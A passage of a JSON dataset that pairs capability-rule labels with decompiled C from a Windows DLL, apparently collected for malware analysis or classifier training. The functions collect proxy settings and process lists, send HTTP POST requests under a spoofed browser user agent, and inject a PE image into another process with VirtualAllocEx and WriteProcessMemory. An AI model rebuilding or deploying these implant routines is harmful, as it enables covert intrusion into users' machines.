0x25;\n    uStack448 = 0x73;\n    uStack446 = 0x5c;\n    uStack444 = 0x74;\n    uStack442 = 0;\n    uStack736 = 0x50;\n    uStack734 = 0x72;\n    uStack732 = 0x6f;\n    uStack730 = 0x78;\n    uStack728 = 0x79;\n    uStack726 = 0x53;\n    uStack724 = 0x65;\n    uStack722 = 0x72;\n    uStack720 = 0x76;\n    uStack718 = 0x65;\n    uStack716 = 0x72;\n    uStack714 = 0x3a;\n    uStack712 = 0x20;\n    uStack710 = 0x25;\n    uStack708 = 0x73;\n    uStack706 = 0;\n    uStack616 = 0x53;\n    uStack614 = 0x6f;\n    uStack612 = 0x66;\n    uStack610 = 0x74;\n    uStack608 = 0x77;\n    uStack606 = 0x61;\n    uStack604 = 0x72;\n    uStack602 = 0x65;\n    uStack600 = 0x5c;\n    uStack598 = 0x4d;\n    uStack596 = 0x69;\n    uStack594 = 99;\n    uStack592 = 0x72;\n    uStack590 = 0x6f;\n    uStack588 = 0x73;\n    uStack586 = 0x6f;\n    uStack584 = 0x66;\n    uStack582 = 0x74;\n    uStack580 = 0x5c;\n    uStack578 = 0x57;\n    uStack576 = 0x69;\n    uStack574 = 0x6e;\n    uStack572 = 100;\n    uStack570 = 0x6f;\n    uStack568 = 0x77;\n    uStack566 = 0x73;\n    uStack564 = 0x5c;\n    uStack562 = 0x43;\n    uStack560 = 0x75;\n    uStack558 = 0x72;\n    uStack556 = 0x72;\n    uStack554 = 0x65;\n    uStack552 = 0x6e;\n    uStack550 = 0x74;\n    uStack548 = 0x56;\n    uStack546 = 0x65;\n    uStack544 = 0x72;\n    uStack542 = 0x73;\n    uStack540 = 0x69;\n    uStack538 = 0x6f;\n    uStack536 = 0x6e;\n    uStack534 = 0x5c;\n    uStack532 = 0x49;\n    uStack530 = 0x6e;\n    uStack528 = 0x74;\n    uStack526 = 0x65;\n    uStack524 = 0x72;\n    uStack522 = 0x6e;\n    uStack520 = 0x65;\n    uStack518 = 0x74;\n    uStack516 = 0x20;\n    uStack514 = 0x53;\n    uStack512 = 0x65;\n    uStack510 = 0x74;\n    uStack508 = 0x74;\n    uStack506 = 0x69;\n    uStack504 = 0x6e;\n    uStack502 = 0x67;\n    uStack500 = 0x73;\n    uStack498 = 0;\n    uStack656 = 0x41;\n    uStack654 = 0x75;\n    uStack652 = 0x74;\n    uStack650 = 0x6f;\n    uStack648 = 0x43;\n    uStack646 = 0x6f;\n    uStack644 = 0x6e;\n    uStack642 = 0x66;\n    uStack640 = 0x69;\n    uStack638 = 0x67;\n    uStack636 = 0x55;\n    uStack634 = 0x72;\n    uStack632 = 0x6c;\n    uStack630 = 0;\n    uStack760 = 0x50;\n    uStack758 = 0x72;\n    uStack756 = 0x6f;\n    uStack754 = 0x78;\n    uStack752 = 0x79;\n    uStack750 = 0x45;\n    uStack748 = 0x6e;\n    uStack746 = 0x61;\n    uStack744 = 0x62;\n    uStack742 = 0x6c;\n    uStack740 = 0x65;\n    uStack738 = 0;\n    uStack688 = 0x50;\n    uStack686 = 0x72;\n    uStack684 = 0x6f;\n    uStack682 = 0x78;\n    uStack680 = 0x79;\n    uStack678 = 0x53;\n    uStack676 = 0x65;\n    uStack674 = 0x72;\n    uStack672 = 0x76;\n    uStack670 = 0x65;\n    uStack668 = 0x72;\n    uStack666 = 0;\n    acStack664[0] = '\\0';\n    fcn.180002260(acStack664);\n    uVar2 = (**0x18001df18)();\n    iStack692 = fcn.1800020d0(uVar2);\n    if ((acStack664[0] == '\\0') || (iStack692 == 0)) {\n        uVar2 = 0x20019;\n        puVar6 = NULL;\n        iStack488 = (**0x18001df98)(0xffffffff80000001, &uStack616, 0, 0x20019, &uStack704);\n    }\n    else {\n        uVar2 = 0x20119;\n        puVar6 = NULL;\n        iStack488 = (**0x18001df98)(0xffffffff80000001, &uStack616, 0, 0x20119, &uStack704);\n    }\n    if (iStack488 == 0) {\n        uStack436 = 4;\n        iStack24 = 0;\n        uStack424 = 0;\n        puVar5 = auStack422;\n        for (iVar3 = 0x18e; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = 0;\n            puVar5 = puVar5 + 1;\n        }\n        auStack20[0] = 200;\n        uVar2 = 0;\n        iStack440 = (**0x18001dfa8)(uStack704, &uStack656, 0, 0, &uStack424, auStack20);\n        if (iStack440 == 0) {\n            uVar4 = 0xffffffffffffffff;\n            piVar7 = arg1;\n            do {\n                if (uVar4 == 0) break;\n                uVar4 = uVar4 - 1;\n                iVar1 = *piVar7;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n            fcn.18000a0ac(arg1 + (~uVar4 - 1), &uStack480, &uStack424, uVar2);\n        }\n        auStack20[0] = 4;\n        uVar2 = 0;\n        puVar6 = NULL;\n        iStack440 = (**0x18001dfa8)(uStack704, &uStack760, 0, 0, &iStack24, auStack20);\n        if ((iStack440 == 0) && (iStack24 != 0)) {\n            auStack20[0] = 200;\n            puVar6 = &uStack424;\n            for (iVar3 = 400; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = 0;\n                puVar6 = puVar6 + 1;\n            }\n            uVar2 = 0;\n            puVar6 = NULL;\n            iStack440 = (**0x18001dfa8)(uStack704, &uStack688, 0, 0, &uStack424, auStack20);\n            if (iStack440 == 0) {\n                uVar4 = 0xffffffffffffffff;\n                piVar7 = arg1;\n                do {\n                    if (uVar4 == 0) break;\n                    uVar4 = uVar4 - 1;\n                    iVar1 = *piVar7;\n                    piVar7 = piVar7 + 1;\n                } while (iVar1 != 0);\n                puVar6 = &uStack424;\n                fcn.18000a0ac(arg1 + (~uVar4 - 1), &uStack736, puVar6, uVar2);\n            }\n        }\n    }\n    uVar4 = 0xffffffffffffffff;\n    piVar7 = arg1;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        iVar1 = *piVar7;\n        piVar7 = piVar7 + 1;\n    } while (iVar1 != 0);\n    fcn.18000a0ac(arg1 + (~uVar4 - 1), 0x180018a5c, puVar6, uVar2);\n    return arg1;\n}\n",
        "token_count": 3247
    },
    "18000446": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint16_t * fcn.180004460(int16_t *arg1, ulong noname_1, ulong arg3, ulong arg4)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    char16_t *pcVar5;\n    uchar *puVar6;\n    int16_t *piVar7;\n    int16_t *piVar8;\n    uint auStack1416 [2];\n    uint32_t uStack1408;\n    int16_t aiStack1372 [266];\n    uint32_t uStack840;\n    int64_t iStack832;\n    char acStack824 [16];\n    ushort uStack808;\n    ushort uStack806;\n    ushort uStack804;\n    ushort uStack802;\n    ushort uStack800;\n    ushort uStack798;\n    ushort uStack796;\n    ushort uStack794;\n    ushort uStack792;\n    ushort uStack790;\n    ushort uStack788;\n    ushort uStack786;\n    ushort uStack784;\n    ushort uStack782;\n    ushort uStack780;\n    ushort uStack778;\n    ushort uStack776;\n    ushort uStack774;\n    ushort uStack772;\n    ushort uStack770;\n    ushort uStack768;\n    ushort uStack766;\n    ushort uStack764;\n    ushort uStack762;\n    ushort uStack760;\n    ushort uStack758;\n    ushort uStack756;\n    ushort uStack754;\n    ushort uStack752;\n    ushort uStack750;\n    ushort uStack748;\n    ushort uStack746;\n    ushort uStack744;\n    ushort uStack742;\n    ushort uStack740;\n    ushort uStack738;\n    ushort uStack736;\n    ushort uStack734;\n    ushort uStack732;\n    ushort uStack730;\n    ushort uStack728;\n    ushort uStack726;\n    ushort uStack724;\n    ushort uStack722;\n    uchar auStack712 [8];\n    int64_t iStack704;\n    uchar auStack696 [14];\n    uint16_t uStack682;\n    uint16_t uStack678;\n    uint16_t uStack676;\n    int64_t iStack672;\n    uchar auStack664 [8];\n    uint32_t auStack656 [2];\n    uchar auStack648 [8];\n    uint uStack640;\n    int16_t iStack632;\n    uchar auStack630 [526];\n    int32_t iStack104;\n    int16_t *piStack96;\n    ulong uStack88;\n    int16_t *piStack80;\n    ulong uStack72;\n    int16_t *piStack64;\n    ulong uStack56;\n    uint32_t uStack48;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    \n    iStack832 = (**0x18001de70)(2, 0);\n    fcn.18000a0ac(arg1, 0x180018a64, arg3, arg4);\n    acStack824[0] = '\\0';\n    fcn.180002260(acStack824);\n    uStack840 = (**0x18001df20)();\n    uStack808 = 0x25;\n    uStack806 = 100;\n    uStack804 = 0x20;\n    uStack802 = 0x25;\n    uStack800 = 100;\n    uStack798 = 0x20;\n    uStack796 = 0x25;\n    uStack794 = 100;\n    uStack792 = 0x20;\n    uStack790 = 0x25;\n    uStack788 = 100;\n    uStack786 = 0x2f;\n    uStack784 = 0x25;\n    uStack782 = 0x30;\n    uStack780 = 0x32;\n    uStack778 = 100;\n    uStack776 = 0x2f;\n    uStack774 = 0x25;\n    uStack772 = 0x30;\n    uStack770 = 0x32;\n    uStack768 = 100;\n    uStack766 = 0x2d;\n    uStack764 = 0x25;\n    uStack762 = 0x30;\n    uStack760 = 0x32;\n    uStack758 = 100;\n    uStack756 = 0x3a;\n    uStack754 = 0x25;\n    uStack752 = 0x30;\n    uStack750 = 0x32;\n    uStack748 = 100;\n    uStack746 = 0x3a;\n    uStack744 = 0x25;\n    uStack742 = 0x30;\n    uStack740 = 0x32;\n    uStack738 = 100;\n    uStack736 = 0x20;\n    uStack734 = 0x25;\n    uStack732 = 0x73;\n    uStack730 = 0x25;\n    uStack728 = 0x73;\n    uStack726 = 0xd;\n    uStack724 = 10;\n    uStack722 = 0;\n    if (iStack832 != -1) {\n        auStack1416[0] = 0x238;\n        iVar2 = (**0x18001de78)(iStack832, auStack1416);\n        if (iVar2 != 0) {\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(uStack1408, auStack656);\n                if (iVar2 == 0) {\n                    auStack656[0] = 0;\n                }\n                iStack672 = 0;\n                iStack632 = 0;\n                puVar6 = auStack630;\n                for (iVar3 = 0x206; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar6 = 0;\n                    puVar6 = puVar6 + 1;\n                }\n                uStack640 = 0x104;\n                iStack704 = (**0x18001de90)(0x1000, 0);\n                if (iStack704 != 0) {\n                    (**0x18001df58)(iStack704, auStack712, auStack648, auStack696, auStack664);\n                    (**0x18001df60)(iStack704, 0);\n                    iStack104 = fcn.1800020d0(iStack704);\n                    if ((acStack824[0] == '\\0') || ((acStack824[0] != '\\0' && (iStack104 != 0)))) {\n                        piStack96 = &iStack632;\n                        uStack88 = 0;\n                        iVar3 = -1;\n                        piVar8 = piStack96;\n                        do {\n                            piVar7 = piVar8;\n                            if (iVar3 == 0) break;\n                            iVar3 = iVar3 + -1;\n                            piVar7 = piVar8 + 1;\n                            iVar1 = *piVar8;\n                            piVar8 = piVar7;\n                        } while (iVar1 != 0);\n                        pcVar5 = L\"(32)\";\n                        piVar8 = piVar7 + -1;\n                        for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *piVar8 = *pcVar5;\n                            pcVar5 = pcVar5 + 1;\n                            piVar8 = piVar8 + 1;\n                        }\n                    }\n                    else {\n                        piStack80 = &iStack632;\n                        uStack72 = 0;\n                        iVar3 = -1;\n                        piVar8 = piStack80;\n                        do {\n                            piVar7 = piVar8;\n                            if (iVar3 == 0) break;\n                            iVar3 = iVar3 + -1;\n                            piVar7 = piVar8 + 1;\n                            iVar1 = *piVar8;\n                            piVar8 = piVar7;\n                        } while (iVar1 != 0);\n                        pcVar5 = L\"(64)\";\n                        piVar8 = piVar7 + -1;\n                        for (iVar3 = 10; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *piVar8 = *pcVar5;\n                            pcVar5 = pcVar5 + 1;\n                            piVar8 = piVar8 + 1;\n                        }\n                    }\n                }\n                (**0x18001df68)(auStack712, auStack648);\n                (**0x18001df70)();\n                if (iStack632 == 0) {\n                    piStack64 = aiStack1372;\n                }\n                else {\n                    piStack64 = &iStack632;\n                }\n                if (uStack840 == uStack1408) {\n                    uStack56 = 0x18001886c;\n                }\n                else {\n                    uStack56 = 0x180018884;\n                }\n                uStack48 = uStack676;\n                uStack44 = uStack678;\n                uStack40 = uStack682;\n                uVar4 = 0xffffffffffffffff;\n                piVar8 = arg1;\n                do {\n                    if (uVar4 == 0) break;\n                    uVar4 = uVar4 - 1;\n                    iVar1 = *piVar8;\n                    piVar8 = piVar8 + 1;\n                } while (iVar1 != 0);\n                fcn.18000a0ac(arg1 + (~uVar4 - 1), &uStack808, uStack1408, auStack656[0]);\n                if (iStack704 != 0) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack704);\n                }\n                if (iStack672 != 0) {\n                    fcn.18000a06c(iStack672);\n                }\n                iVar2 = (**0x18001de80)(iStack832, auStack1416);\n            } while (iVar2 != 0);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack832);\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 2168
    },
    "180004ab": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.180004ab0(int64_t arg1, uint *arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uchar *puVar3;\n    ushort *in_stack_00000028;\n    uint32_t uStack2296;\n    int32_t iStack2292;\n    uchar *puStack2288;\n    uchar auStack2280 [2096];\n    int32_t iStack184;\n    uint uStack180;\n    int32_t iStack176;\n    uint auStack168 [2];\n    uchar auStack160 [12];\n    uint uStack148;\n    ulong uStack144;\n    uint uStack136;\n    ushort uStack132;\n    ulong uStack96;\n    uint uStack88;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack40;\n    uchar *puStack32;\n    uchar *puStack24;\n    \n    iStack184 = 0;\n    if (arg1 == 0) {\n        return false;\n    }\n    auStack168[0] = 0x68;\n    puVar3 = auStack160;\n    for (iVar2 = 0x60; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    uStack136 = 0x824;\n    uStack88 = 0x824;\n    puStack2288 = NULL;\n    uStack2296 = 0x824;\n    iStack2292 = 0;\n    uStack180 = 0x2000000;\n    uStack56 = 0x2000000;\n    uStack52 = 0;\n    uStack144 = arg3;\n    uStack96 = arg4;\n    iStack176 = (**0x18001dfd0)(arg1, auStack2280, &uStack2296, 0x2000000);\n    if (iStack176 == 0) {\n        iVar1 = (**0x18001def8)();\n        if (iVar1 != 0x7a) {\n            return false;\n        }\n        uStack48 = 0;\n        puStack2288 = fcn.18000a610(uStack2296);\n        iStack2292 = 1;\n        puStack40 = puStack2288;\n        iStack176 = (**0x18001dfd0)(arg1, puStack2288, &uStack2296, uStack56);\n        if (iStack176 == 0) {\n            puStack32 = puStack2288;\n            fcn.18000a534(puStack2288);\n            return false;\n        }\n    }\n    else {\n        puStack2288 = auStack2280;\n    }\n    iStack176 = (**0x18001dfd8)(puStack2288, 0, uStack52, auStack168);\n    if (iStack176 == 0) {\n        iStack184 = (**0x18001def8)();\n    }\n    *arg2 = uStack148;\n    *in_stack_00000028 = uStack132;\n    if (iStack2292 != 0) {\n        puStack24 = puStack2288;\n        fcn.18000a534(puStack2288);\n    }\n    return iStack184 == 0;\n}\n",
        "token_count": 738
    },
    "180004d2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.180004d20(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uchar *puVar7;\n    uchar *puVar8;\n    int64_t iStackX16;\n    int64_t iStackX24;\n    ulong uStackX32;\n    ulong uStack24;\n    \n    uStack24 = 0x180004d40;\n    iStackX16 = arg2;\n    iStackX24._0_4_ = arg3;\n    uStackX32 = arg4;\n    iVar3 = fcn.180013f60();\n    iVar3 = -iVar3;\n    **(&stack0x00004610 + iVar3) = 0;\n    **(&stack0x00004618 + iVar3) = 0;\n    *(&stack0x00000454 + iVar3) = 0;\n    (&stack0x00000460)[iVar3] = 0;\n    puVar7 = &stack0x00000461 + iVar3;\n    for (iVar5 = 0x103; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    (&stack0x00000040)[iVar3] = 0;\n    puVar7 = &stack0x00000041 + iVar3;\n    for (iVar5 = 0x3ff; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *(&stack0x00000010 + iVar3) = &stack0x00000034 + iVar3;\n    *(&stack0xffffffffffffffe8 + iVar3) = 0x180004dc9;\n    iVar1 = fcn.180004ab0(*(&stack0x000045f0 + iVar3), &stack0x00000440 + iVar3, &stack0x00000460 + iVar3, \n                          &stack0x00000040 + iVar3);\n    if (iVar1 == 0) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        *(&stack0x00000010 + iVar3) = 0;\n        *(&stack0xffffffffffffffe8 + iVar3) = 0x180004def;\n        uVar4 = (**0x18001dfe0)(0, 0, 0, 0);\n        *(&stack0x00000448 + iVar3) = uVar4;\n        if (*(&stack0x00000448 + iVar3) == 0) {\n            uVar2 = *(&stack0x00000454 + iVar3);\n        }\n        else {\n            *(&stack0x00000580 + iVar3) = 0;\n            *(&stack0x00000458 + iVar3) = 0;\n            *(&stack0x00000578 + iVar3) = 0x4280300;\n            *(&stack0x00000028 + iVar3) = 0;\n            *(&stack0x00000020 + iVar3) = *(&stack0x00000578 + iVar3);\n            *(&stack0x00000018 + iVar3) = 3;\n            *(&stack0x00000010 + iVar3) = 0;\n            *(&stack0xffffffffffffffe8 + iVar3) = 0x180004e75;\n            uVar4 = (**0x18001dfe8)(*(&stack0x00000448 + iVar3), &stack0x00000460 + iVar3, *(&stack0x00000034 + iVar3), \n                                    0);\n            *(&stack0x00000580 + iVar3) = uVar4;\n            if (*(&stack0x00000580 + iVar3) == 0) {\n                *(&stack0xffffffffffffffe8 + iVar3) = 0x180004e96;\n                (**0x18001dff0)(*(&stack0x00000448 + iVar3));\n                uVar2 = *(&stack0x00000454 + iVar3);\n            }\n            else {\n                *(&stack0x00000588 + iVar3) = 0x1800187a8;\n                *(&stack0x00000590 + iVar3) = 0;\n                if (*(&stack0x00000034 + iVar3) == 0x1bb) {\n                    *(&stack0x00000578 + iVar3) = *(&stack0x00000578 + iVar3) | 0x803000;\n                }\n                *(&stack0x00000028 + iVar3) = 0;\n                *(&stack0x00000020 + iVar3) = *(&stack0x00000578 + iVar3);\n                *(&stack0x00000018 + iVar3) = &stack0x00000588 + iVar3;\n                *(&stack0x00000010 + iVar3) = *(&stack0x00004608 + iVar3);\n                *(&stack0xffffffffffffffe8 + iVar3) = 0x180004f2b;\n                uVar4 = (**0x18001dff8)(*(&stack0x00000580 + iVar3), \"POST\", &stack0x00000040 + iVar3, \"HTTP/1.1\");\n                *(&stack0x00000458 + iVar3) = uVar4;\n                if (*(&stack0x00000458 + iVar3) == 0) {\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180004f4c;\n                    (**0x18001dff0)(*(&stack0x00000580 + iVar3));\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180004f5a;\n                    (**0x18001dff0)(*(&stack0x00000448 + iVar3));\n                    uVar2 = *(&stack0x00000454 + iVar3);\n                }\n                else {\n                    *(&stack0x00000038 + iVar3) = 180000;\n                    *(&stack0x00000574 + iVar3) = 180000;\n                    *(&stack0x00000030 + iVar3) = 180000;\n                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180004fa2;\n                    iVar1 = (**0x18001e000)(*(&stack0x00000458 + iVar3), 5, &stack0x00000574 + iVar3, 4);\n                    if (iVar1 != 0) {\n                        *(&stack0xffffffffffffffe8 + iVar3) = 0x180004fc4;\n                        iVar1 = (**0x18001e000)(*(&stack0x00000458 + iVar3), 6, &stack0x00000030 + iVar3, 4);\n                        if (iVar1 != 0) {\n                            *(&stack0xffffffffffffffe8 + iVar3) = 0x180004fe6;\n                            iVar1 = (**0x18001e000)(*(&stack0x00000458 + iVar3), 2, &stack0x00000038 + iVar3, 4);\n                            if (iVar1 != 0) {\n                                *(&stack0x00000010 + iVar3) = *(&stack0x00004600 + iVar3);\n                                *(&stack0xffffffffffffffe8 + iVar3) = 0x180005024;\n                                iVar1 = (**0x18001e008)(*(&stack0x00000458 + iVar3), \n                                                        \"Accept-Language: en\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\\r\\n\"\n                                                        , 0xffffffff, *(&stack0x000045f8 + iVar3));\n                                if (iVar1 == 0) {\n                                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180005036;\n                                    (**0x18001dff0)(*(&stack0x00000458 + iVar3));\n                                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180005044;\n                                    (**0x18001dff0)(*(&stack0x00000580 + iVar3));\n                                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180005052;\n                                    (**0x18001dff0)(*(&stack0x00000448 + iVar3));\n                                    return *(&stack0x00000454 + iVar3);\n                                }\n                                *(&stack0x00000570 + iVar3) = 0;\n                                *(&stack0x00000450 + iVar3) = 4;\n                                *(&stack0x00000010 + iVar3) = 0;\n                                *(&stack0xffffffffffffffe8 + iVar3) = 0x1800050a0;\n                                iVar1 = (**0x18001e010)(*(&stack0x00000458 + iVar3), 0x20000013, \n                                                        &stack0x00000570 + iVar3, &stack0x00000450 + iVar3);\n                                if (iVar1 == 0) {\n                                    if (*(&stack0x00000458 + iVar3) != 0) {\n                                        *(&stack0xffffffffffffffe8 + iVar3) = 0x18000532b;\n                                        (**0x18001dff0)(*(&stack0x00000458 + iVar3));\n                                    }\n                                }\n                                else if (*(&stack0x00000570 + iVar3) == 200) {\n                                    (&stack0x000005c0)[iVar3] = 0;\n                                    puVar7 = &stack0x000005c1 + iVar3;\n                                    for (iVar5 = 0x3fff; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                        *puVar7 = 0;\n                                        puVar7 = puVar7 + 1;\n                                    }\n                                    *(&stack0x000005a8 + iVar3) = 0;\n                                    while( true ) {\n                                        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005108;\n                                        iVar1 = (**0x18001e018)(*(&stack0x00000458 + iVar3), &stack0x0000059c + iVar3, 0\n                                                                , 0);\n                                        if ((iVar1 == 0) || (*(&stack0x0000059c + iVar3) == 0)) break;\n                                        if (*(&stack0x0000059c + iVar3) < 0x4000) {\n                                            *(&stack0x000045c8 + iVar3) = *(&stack0x0000059c + iVar3);\n                                        }\n                                        else {\n                                            *(&stack0x000045c8 + iVar3) = 0x4000;\n                                        }\n                                        *(&stack0x000005b0 + iVar3) = *(&stack0x000045c8 + iVar3);\n                                        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005180;\n                                        iVar1 = (**0x18001e020)(*(&stack0x00000458 + iVar3));\n                                        if ((iVar1 == 0) || (*(&stack0x00000598 + iVar3) == 0)) break;\n                                        if ((*(&stack0x000005a8 + iVar3) == 0) || (**(&stack0x00004610 + iVar3) != 0)) {\n                                            if (**(&stack0x00004610 + iVar3) != 0) {\n                                                *(&stack0x000005a8 + iVar3) = **(&stack0x00004610 + iVar3);\n                                            }\n                                            iVar1 = **(&stack0x00004618 + iVar3);\n                                            uVar4 = **(&stack0x00004610 + iVar3);\n                                            *(&stack0xffffffffffffffe8 + iVar3) = 0x1800051fc;\n                                            uVar4 = fcn.18000a53c(uVar4, iVar1 + *(&stack0x00000598 + iVar3));\n                                            **(&stack0x00004610 + iVar3) = uVar4;\n                                            if (**(&stack0x00004610 + iVar3) != 0) {\n                                                puVar7 = &stack0x000005c0 + iVar3;\n                                                puVar8 = **(&stack0x00004618 + iVar3) + **(&stack0x00004610 + iVar3);\n                                                for (uVar6 = *(&stack0x00000598 + iVar3); uVar6 != 0; uVar6 = uVar6 - 1)\n                                                {\n                                                    *puVar8 = *puVar7;\n                                                    puVar7 = puVar7 + 1;\n                                                    puVar8 = puVar8 + 1;\n                                                }\n                                                **(&stack0x00004618 + iVar3) =\n                                                     **(&stack0x00004618 + iVar3) + *(&stack0x00000598 + iVar3);\n                                            }\n                                        }\n                                    }\n                                    if ((**(&stack0x00004610 + iVar3) == 0) && (*(&stack0x000005a8 + iVar3) != 0)) {\n                                        *(&stack0xffffffffffffffe8 + iVar3) = 0x180005289;\n                                        fcn.18000a06c(*(&stack0x000005a8 + iVar3));\n                                        **(&stack0x00004618 + iVar3) = 0;\n                                    }\n                                }\n                                else if (((*(&stack0x00000570 + iVar3) < 300) || (399 < *(&stack0x00000570 + iVar3))) ||\n                                        (**(&stack0x00004620 + iVar3) == 0)) {\n                                    *(&stack0x00000454 + iVar3) = *(&stack0x00000570 + iVar3) + 0x10000000;\n                                }\n                                else {\n                                    *(&stack0x000045c0 + iVar3) = 0x824;\n                                    *(&stack0x00000010 + iVar3) = 0;\n                                    uVar4 = **(&stack0x00004620 + iVar3);\n                                    *(&stack0xffffffffffffffe8 + iVar3) = 0x1800052fb;\n                                    (**0x18001e028)(*(&stack0x00000458 + iVar3), 0x21, uVar4, &stack0x000045c0 + iVar3);\n                                }\n                                if (*(&stack0x00000580 + iVar3) != 0) {\n                                    *(&stack0xffffffffffffffe8 + iVar3) = 0x180005344;\n                                    (**0x18001dff0)(*(&stack0x00000580 + iVar3));\n                                }\n                                if (*(&stack0x00000448 + iVar3) != 0) {\n                                    *(&stack0xffffffffffffffe8 + iVar3) = 0x18000535d;\n                                    (**0x18001dff0)(*(&stack0x00000448 + iVar3));\n                                }\n                                return *(&stack0x00000454 + iVar3);\n                            }\n                        }\n                    }\n                    uVar2 = *(&stack0x00000454 + iVar3);\n                }\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 3384
    },
    "180005b4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.180005b40(ulong arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    int64_t iVar2;\n    uchar *puVar3;\n    ulong in_stack_00000028;\n    uint32_t in_stack_00000030;\n    ulong in_stack_fffffffffffffad8;\n    uint uVar5;\n    uint64_t *puVar4;\n    uint64_t uStack1280;\n    uint uStack1272;\n    ulong uStack1264;\n    ulong uStack1256;\n    ulong uStack1248;\n    ulong uStack1232;\n    int64_t iStack1224;\n    uchar uStack1216;\n    uint uStack1212;\n    uint32_t uStack1208;\n    int64_t iStack1200;\n    int64_t iStack1192;\n    int64_t iStack1176;\n    int64_t iStack1168;\n    uint32_t uStack1160;\n    uint32_t uStack1156;\n    uint uStack1152;\n    int32_t iStack1148;\n    int64_t iStack1144;\n    uint32_t uStack1136;\n    int64_t iStack1128;\n    int32_t iStack1120;\n    uchar auStack1116 [4];\n    uint64_t uStack1112;\n    int64_t iStack1104;\n    int64_t iStack1096;\n    uint32_t uStack1088;\n    uchar auStack1080 [1024];\n    uchar auStack56 [8];\n    int64_t iStack48;\n    int64_t iStack40;\n    uint64_t uStack32;\n    uint64_t uStack24;\n    \n    uVar5 = in_stack_fffffffffffffad8 >> 0x20;\n    uStack1272 = 0;\n    arg1_00 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x1fffff, 0, arg1);\n    if (arg1_00 == 0) {\n        return 0;\n    }\n    iStack1120 = fcn.1800020d0(arg1_00);\n    iStack1148 = 0;\n    iStack1176 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    if (iStack1176 != 0) {\n        iStack1148 = fcn.1800020d0(iStack1176);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack1176);\n    }\n    if (iStack1120 == iStack1148) {\n        uStack1152 = 0;\n        auStack1116[0] = 0;\n        auStack56[0] = 0;\n        iVar1 = fcn.180006250(arg3, &uStack1152, auStack1116, auStack56);\n        if (iVar1 != 0) {\n            iStack1168 = arg3 + *(arg3 + 0x3c);\n            iStack48 = iStack1168 + 0x18 + *(iStack1168 + 0x14);\n            uStack1156 = *(iStack1168 + 6);\n            uStack1088 = *(iStack1168 + 0x50);\n            uStack1136 = *(iStack1168 + 0x54);\n            iStack40 = arg3;\n            iStack1144 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)\n                                   (arg1_00, 0, uStack1088 + uStack1136 + in_stack_00000030, 0x3000, \n                                    CONCAT44(uVar5, 0x40));\n            if (iStack1144 != 0) {\n                puVar3 = auStack1080;\n                for (iVar2 = 0x400; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n                iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(arg1_00, iStack1144, arg3, uStack1136, &uStack1280);\n                if (((iVar1 != 0) && (uStack1280 == 